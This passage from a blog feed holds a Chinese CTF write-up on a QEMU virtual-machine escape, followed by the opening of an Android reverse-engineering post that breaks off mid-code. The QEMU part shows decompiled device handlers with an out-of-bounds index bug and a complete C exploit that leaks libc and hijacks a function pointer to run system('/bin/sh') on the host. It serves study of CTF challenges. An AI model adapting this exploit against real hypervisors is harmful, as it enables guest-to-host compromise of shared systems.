<code>PCI BAR 0</code> 时，会映射到设备的 <code>MMIO</code> 区域。</li></ul></li><li><strong>设备状态初始化</strong>：  <ul><li>缓冲区、日志、状态寄存器等均被清零或设为默认值。</li></ul></li><li><strong>日志机制</strong>：  <ul><li>默认日志输出到 <code>stderr</code>，可通过修改 <code>log_fd</code> 和 <code>log_handler</code> 重定向。</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> __cdecl <span class="title">ccb_dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> val; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">55</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_read&quot;</span>);</span><br><span class="line">  val = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      val = ds_0-&gt;index;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      val = ds_0-&gt;buffer[ds_0-&gt;index];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      val = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      val = ds_0-&gt;log_arg;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      val = ds_0-&gt;status;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现如果index域可控，那么就有个越界读取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">85</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      ds_0-&gt;index = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      ds_0-&gt;buffer[ds_0-&gt;index] = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( ds_0-&gt;log_handler )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;<span class="built_in">log_handler</span>(ds_0-&gt;log_fd, ds_0-&gt;log_format, ds_0-&gt;log_arg);</span><br><span class="line">        ds_0-&gt;status = <span class="number">1074749</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;status = <span class="number">16388413</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      ds_0-&gt;log_arg = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      ds_0-&gt;log_fd = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现index可控，且有个越界写，在0xC选项中有个函数执行</p><p>那么思路就是：</p><p>覆盖log_handler为system，然后log_fd为&#x2F;bin&#x2F;sh的地址，就能实现qemu的逃逸，妙！！</p><p>而要与MMIO进行交互 就得通过<code>resource0</code></p><h4 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_system_offset 0x50d70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_dprintf_offset 0x60a10</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">getMMIOBase</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = <span class="built_in">open</span>(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getMMIOBase</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem Resource0Base: %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x12</span>);<span class="comment">//set index-&gt;12=fprintf_high</span></span><br><span class="line">    <span class="type">uint32_t</span> index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_fprintf = <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line">    libc_fprintf=libc_fprintf&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    libc_fprintf += <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);<span class="comment">//dprintf</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="type">uint64_t</span> libcbase=libc_fprintf-libc_dprintf_offset;</span><br><span class="line">    <span class="type">uint64_t</span> system=libcbase+libc_system_offset;</span><br><span class="line">    <span class="type">uint64_t</span> bin_sh=libcbase+<span class="number">0x1d8678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase: 0x%llx.\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] bin_sh: 0x%llx.\n&quot;</span>, bin_sh);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system: 0x%llx.\n&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x13</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(bin_sh&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(system&amp;<span class="number">0xffffffff</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0xc</span>,<span class="number">0xbeef</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的wp是由<strong>youlin</strong>师傅写的，只做学习作用</p></blockquote><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>先用gdb加载这个qemu的符号表，然后再通过attach pid来附加上这个qemu进程</p><h4 id="偏移寻找"><a href="#偏移寻找" class="headerlink" title="偏移寻找"></a>偏移寻找</h4><p>本地qemu的偏移是通过本地的libc给的，会跟远程的不一样，因此要先在本地打通之后，再修改成远程给的docker的libc的偏移，最后就能成功getshell</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh:turning off NDELAY mode</span></span><br></pre></td></tr></table></figure><p>本地获得shell之后可能会遇到这种情况，youlin师傅说这可能是管道的冲突，但是远程是可以打通的</p><p>在 Guest 用户态 C 代码中对 <code>mmio_mem</code> 指针的操作，最终会触发 QEMU Host 进程中相应的设备模拟代码的执行</p><p>当你通过这个指针进行读写操作时：</p><ol><li>Guest OS 将<strong>虚拟地址转换为物理地址</strong>。</li><li>QEMU 拦截对这些特定物理地址的访问。</li><li>QEMU 调用其内部对应的设备模型 MMIO 处理函数（如 <code>ccb_dev_mmio_write</code> &#x2F; <code>read</code> 或针对该设备的其他特定函数），并将偏移量和（对于写入）数据传递给这些函数</li></ol><h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">timeout <span class="number">300</span> ./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">1</span>G \</span><br><span class="line">   -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz<span class="number">-5.0</span><span class="number">.5</span>-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><p>删除timeout，可以发现漏洞应该在pipeline上·</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;qemu逃逸学习&quot;&gt;&lt;a href=&quot;#qemu逃逸学习&quot; class=&quot;headerlink&quot; title=&quot;qemu逃逸学习&quot;&gt;&lt;/a&gt;qemu逃逸学习&lt;/h1&gt;&lt;p&gt;CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个p</summary>
      
    
    
    
    <category term="qemu" scheme="http://s1nec-1o.github.io/categories/qemu/"/>
    
    <category term="虚拟机" scheme="http://s1nec-1o.github.io/categories/qemu/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="qemu逃逸" scheme="http://s1nec-1o.github.io/tags/qemu%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向之Wiki篇</title>
    <link href="http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/"/>
    <id>http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/</id>
    <published>2025-04-14T06:44:43.000Z</published>
    <updated>2025-04-14T06:56:13.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态分析java层"><a href="#静态分析java层" class="headerlink" title="静态分析java层"></a>静态分析java层</h1><h2 id="2014-ASIS-Cyber-Security-Contest-Finals-Numdroid"><a href="#2014-ASIS-Cyber-Security-Contest-Finals-Numdroid" class="headerlink" title="2014 ASIS Cyber Security Contest Finals Numdroid"></a>2014 ASIS Cyber Security Contest Finals Numdroid</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    ArrayTools.<span class="built_in">each_with_index</span>(buttons, <span class="keyword">new</span> <span class="built_in">EachIndexAction</span>&lt;Integer&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.EachIndexAction</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">action</span>(<span class="keyword">final</span> <span class="type">int</span> i, Integer element) &#123;</span><br><span class="line">            ((Button) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(element.<span class="built_in">intValue</span>())).<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1.1</span></span><br><span class="line">                @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.<span class="built_in">clicked</span>(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mScreen = (EditText) <span class="built_in">findViewById</span>(R.id.editText1);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setEnabled</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">this</span>.mOk = (ImageButton) <span class="built_in">findViewById</span>(R.id.ok);</span><br><span class="line">    <span class="keyword">this</span>.mDel = (ImageButton) <span class="built_in">findViewById</span>(R.id.del);</span><br><span class="line">    <span class="keyword">this</span>.mOk.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.2</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">ok_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mDel.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.3</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">del_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先遍历按钮数组，并进行初始化和设置点击事件 <code>MainActivity.this.clicked(i);</code></li><li>然后对OK和del按钮进行初始化并设置点击事件分别为 <code>MainActivity.this.ok_clicked();</code> 和 <code>MainActivity.this.del_clicked();</code></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">clicked</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;number: &quot;</span> + i);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">append</span>((CharSequence) Integer.<span class="built_in">toString</span>(i)));</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;current Pass: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击按钮时候会先log记录下来，然后再将数字转为String显示到屏幕上，然后再log记录下当前的passwd</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">ok_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;clicked password: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">    boolean result = Verify.<span class="built_in">isOk</span>(<span class="keyword">this</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>());</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;password is Ok? : &quot;</span> + result);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        Intent i = <span class="keyword">new</span> <span class="built_in">Intent</span>(<span class="keyword">this</span>, (Class&lt;?&gt;) LipSum.<span class="keyword">class</span>);</span><br><span class="line">        Bundle b = <span class="keyword">new</span> <span class="built_in">Bundle</span>();</span><br><span class="line">        b.<span class="built_in">putString</span>(<span class="string">&quot;flag&quot;</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>().<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>));</span><br><span class="line">        i.<span class="built_in">putExtras</span>(b);</span><br><span class="line">        <span class="built_in">startActivity</span>(i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.<span class="built_in">makeText</span>(<span class="keyword">this</span>, R.string.wrong, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击OK按钮，会先log记录当前的passwd，然后通过Verify.isOk对其进行check，如果密码正确会进入到分支，然后会把flag放到屏幕上，显然这就是胜利条件了</p><p>第一个idea，对isOk进行hook，测试之后发现，他的flag是md5的密码，显然偷鸡失败（&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>那么就要研究isOk函数的逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 